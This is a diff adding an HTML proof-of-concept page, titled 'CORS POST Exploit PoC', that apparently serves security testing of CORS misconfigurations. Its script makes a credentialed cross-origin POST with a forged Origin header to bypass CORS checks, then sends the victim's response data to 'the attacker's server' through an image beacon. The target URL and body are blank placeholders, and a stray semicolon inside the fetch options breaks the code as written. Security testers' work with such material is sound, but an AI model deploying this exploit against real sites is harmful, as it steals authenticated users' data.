@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <body>
+	<h1>CORS POST Exploit PoC</h1>
+	<button id="exploit">Run Exploit</button>
+	<script>
+		var vulnPage = ""; // Target page
+		var originPayload = "http://localhost:81/good-site.com"; // example payload with CORS validation bypass
+		var beaconUrl = "http://localhost:81/poc?data=";
+
+		document.getElementById('exploit').addEventListener('click', () => {
+			fetch(vulnPage, {
+				method: 'POST',
+				credentials: 'include',
+				headers: {
+					'Content-Type': 'application/x-www-form-urlencoded',
+					'Origin': originPayload
+				},
+				body: ""; // POST body payload
+			})
+			.then(response => response.json())
+			.then(data => {
+				console.log('Response:', data);	
+				alert('Exploit successful! Check console logs');
+
+
+				// Send the response to the attacker's server
+				const encodedData = encodeURIComponent(data);
+				new Image().src = `${beaconUrl}${encodedData}`;
+			}).catch(error => {
+				console.error('Error:', error);
+				alert('Exploit failed');
+			});
+		});
+	</script>
+  </body>
+</html>
+
